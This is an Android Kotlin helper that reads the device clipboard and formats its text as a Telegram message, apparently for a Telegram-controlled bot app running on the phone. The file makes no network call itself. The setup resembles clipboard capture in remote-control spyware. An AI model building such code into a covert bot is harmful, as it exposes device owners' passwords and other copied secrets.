package com.example.telegrambot.helpers

import android.content.ClipboardManager
import android.content.Context
import android.os.Handler
import android.os.Looper

object ClipboardHelper {
    fun getClipboardText(context: Context, onResult: (String) -> Unit) {
        Handler(Looper.getMainLooper()).post {
            try {
                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clipData = clipboard.primaryClip
                if (clipData != null && clipData.itemCount > 0) {
                    val text = clipData.getItemAt(0).text?.toString()
                    if (!text.isNullOrEmpty()) {
                        onResult("📋 *Clipboard Content*\n\n`$text`")
                        return@post
                    }
                }
                onResult("📋 Clipboard is currently empty.")
            } catch (e: Exception) {
                e.printStackTrace()
                onResult("❌ Failed to read clipboard: ${e.message}")
            }
        }
    }
}
